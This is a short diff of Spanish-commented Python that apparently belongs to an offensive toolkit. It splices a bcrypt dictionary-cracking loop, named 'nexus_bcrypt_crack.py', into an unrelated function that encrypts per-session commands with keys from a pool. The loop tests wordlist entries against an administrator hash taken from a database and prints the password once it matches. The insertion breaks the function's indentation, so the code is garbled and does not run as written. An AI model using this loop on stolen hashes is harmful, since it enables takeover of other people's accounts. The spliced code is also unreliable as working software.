@@ -540,7 +540,22 @@ keys_pool = ["KRLW6Y3Z...", "MFRGGZDF...", "74T6YVZA..."] # Listado completo en 
 def encrypt_ephemeral_command(command, session_index):
     # Seleccionamos la llave según el progreso de la visita
     current_key_b32 = keys_pool[session_index]
-    
+ # Actualización en nexus_bcrypt_crack.py
+for word in wordlist:
+    password = word.encode('utf-8')
+    try:
+        # Solo intenta si el hash tiene la longitud legal (60 caracteres)
+        if len(hash_admin) == 60:
+            if bcrypt.checkpw(password, hash_admin):
+                print(f"[✔] ¡ÉXITO! Contraseña: {word}")
+                exit(0)
+        else:
+            print(f"[!] Error: Hash truncado ({len(hash_admin)} chars). Re-extraer de la DB.")
+            break 
+    except ValueError as e:
+        print(f"[✘] Salt inválido detectado: {e}")
+        break
+   
     # Lógica de cifrado simétrico derivado (Diffie-Hellman)
     print(f"[🛡️] CIFRANDO COMANDO CON LLAVE EFÍMERA {session_index}...")
     # ... proceso de cifrado ...
